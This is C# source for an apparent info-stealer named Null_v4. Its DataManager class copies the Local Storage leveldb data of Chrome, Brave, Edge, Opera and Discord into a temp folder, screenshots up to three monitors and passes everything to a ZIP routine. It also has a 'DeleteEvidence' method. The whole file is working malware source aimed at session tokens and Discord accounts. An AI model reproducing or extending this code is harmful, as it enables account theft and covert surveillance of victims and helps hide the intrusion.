using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reactive.Concurrency;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Null_v4
{
    public class DataManager
    {

        //Envoirment
        private static protected string Software_Main_Dir = Null_v4.Library.Global_Main_Dir;
        private static protected string Software_Main_Dir_Name = Null_v4.Library.Global_Main_Dir_Name;
        private static protected string Grab_ChromeDir = @"%userprofile%\AppData\Local\Google\Chrome\User Data\Default\*.*";
        private static protected string Grab_BraveDir = @"%userprofile%\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\*.*";
        private static protected string Grab_DiscordDir = @"%userprofile%\AppData\Roaming\discord\Local Storage\leveldb\*.*";

        public static void CopyTrigger()
        { 
            Setup();
        }

        static void Setup()
        {
            if (Directory.Exists(Software_Main_Dir))
            {
                Directory.Delete(Software_Main_Dir, true);
            }

            if (!Directory.Exists(Software_Main_Dir))
            {
                Directory.CreateDirectory(Software_Main_Dir);
            }

            StartCopyProcess();
        }

        private static void StartCopyProcess()
        {

            var userLocalDir = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            var userRoamingDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);



            //Chrome
            string ChromeRoot = userLocalDir + @"\Google\Chrome\User Data\Default\Local Storage\leveldb";
            string ChromeDestination = userLocalDir + @"\Temp\"+ Software_Main_Dir_Name + @"\Chrome\";

            if (!Directory.Exists(ChromeDestination))
            {
                Directory.CreateDirectory(ChromeDestination);
            }

            try
            {
                if (Directory.Exists(ChromeRoot))
                {
                    var ChromeAllFiles = Directory.GetFiles(ChromeRoot);

                    foreach (var file in ChromeAllFiles)
                    {
                        var destFileName = ChromeDestination + Path.GetFileNameWithoutExtension(file) + Path.GetExtension(file);
                        System.IO.File.Copy(file, destFileName, true);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }



            //Brave
            string BraveRoot = userLocalDir + @"\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb";
            string BraveDestination = userLocalDir + @"\Temp\" + Software_Main_Dir_Name + @"\Brave\";

            if (!Directory.Exists (BraveDestination))
            {
                Directory.CreateDirectory(BraveDestination);
            }

            try
            {
                if (Directory.Exists(BraveRoot))
                {
                    var BraveAllFiles = Directory.GetFiles(ChromeRoot);

                    foreach (var file in BraveAllFiles)
                    {
                        var destFileName = BraveDestination + Path.GetFileNameWithoutExtension(file) + Path.GetExtension(file);
                        System.IO.File.Copy(file, destFileName, true);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }



            //Edge
            string EdgeRoot = userLocalDir + @"\Microsoft\Edge\User Data\Default\Local Storage\leveldb";
            string EdgeDestination = userLocalDir + @"\Temp\" + Software_Main_Dir_Name + @"\Edge\";

            if (!Directory.Exists(EdgeDestination))
            {
                Directory.CreateDirectory(EdgeDestination);
            }

            try
            {
                if (Directory.Exists(EdgeRoot))
                {
                    var EdgeAllFiles = Directory.GetFiles(EdgeRoot);

                    foreach (var file in EdgeAllFiles)
                    {
                        var destFileName = EdgeDestination + Path.GetFileNameWithoutExtension(file) + Path.GetExtension(file);
                        System.IO.File.Copy(file, destFileName, true);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }



            //Opera
            string OperaRoot = userRoamingDir + @"\Opera Software\Opera Stable\Default\Local Storage\leveldb";
            string OperaDestination = userLocalDir + @"\Temp\" + Software_Main_Dir_Name + @"\Opera\";

            if (!Directory.Exists(OperaDestination))
            {
                Directory.CreateDirectory(OperaDestination);
            }

            try
            {
                if (Directory.Exists(OperaRoot))
                {
                    var OperaAllFiles = Directory.GetFiles(OperaRoot);

                    foreach (var file in OperaAllFiles)
                    {
                        var destFileName = OperaDestination + Path.GetFileNameWithoutExtension(file) + Path.GetExtension(file);
                        System.IO.File.Copy(file, destFileName, true);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }



            //Discord
            string DiscordRoot = userRoamingDir + @"\discord\Local Storage\leveldb";
            string DiscordDestination = userLocalDir + @"\Temp\" + Software_Main_Dir_Name + @"\Discord\";

            if (!Directory.Exists(DiscordDestination))
            {
                Directory.CreateDirectory(DiscordDestination);
            }

            try
            {
                if (Directory.Exists(DiscordRoot))
                {
                    var DiscordAllFiles = Directory.GetFiles(DiscordRoot);

                    foreach (var file in DiscordAllFiles)
                    {
                        var destFileName = DiscordDestination + Path.GetFileNameWithoutExtension(file) + Path.GetExtension(file);
                        System.IO.File.Copy(file, destFileName, true);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }


            //Screenshot
            try
            {
                Bitmap captureBitmap = new Bitmap(1920, 1080, PixelFormat.Format32bppArgb);

                Rectangle captureRectangle = Screen.AllScreens[0].Bounds;

                Graphics captureGraphics = Graphics.FromImage(captureBitmap);

                captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);

                captureBitmap.Save(Software_Main_Dir + @"\Capture1.jpg", ImageFormat.Jpeg);
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }


            try
            {
                Bitmap captureBitmap = new Bitmap(1920, 1080, PixelFormat.Format32bppArgb);

                Rectangle captureRectangle = Screen.AllScreens[1].Bounds;

                Graphics captureGraphics = Graphics.FromImage(captureBitmap);

                captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);

                captureBitmap.Save(Software_Main_Dir + @"\Capture2.jpg", ImageFormat.Jpeg);
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }

            try
            {
                Bitmap captureBitmap = new Bitmap(1920, 1080, PixelFormat.Format32bppArgb);

                Rectangle captureRectangle = Screen.AllScreens[2].Bounds;

                Graphics captureGraphics = Graphics.FromImage(captureBitmap);

                captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);

                captureBitmap.Save(Software_Main_Dir + @"\Capture3.jpg", ImageFormat.Jpeg);
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }


            ZIPManager.ZIPTrigger();

        }


        public static void DeleteEvidence()
        {
            if (Directory.Exists(Software_Main_Dir))
            {
                Directory.Delete(Software_Main_Dir, true);
            }
        }
    }
}
